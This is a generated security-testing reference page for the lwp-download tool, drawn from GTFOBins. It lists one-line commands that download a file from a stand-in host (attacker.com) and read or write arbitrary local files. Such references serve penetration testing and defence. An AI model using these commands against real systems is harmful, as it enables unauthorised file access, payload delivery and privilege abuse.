---
parsed_by: focuslocust
source: commands
type: generated
---
# lwp-download Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## lwp-download

Tool page: [lwp-download](../../tools/linux/lwp-download.md)

### download

```text
lwp-download http://attacker.com/path/to/input-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
lwp-download file:///path/to/input-file /dev/stdout
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA >/path/to/temp-file
lwp-download file:///path/to/temp-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
lwp-download file:///path/to/input-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download` |
| Evidence | Function example preserved from source parser. |
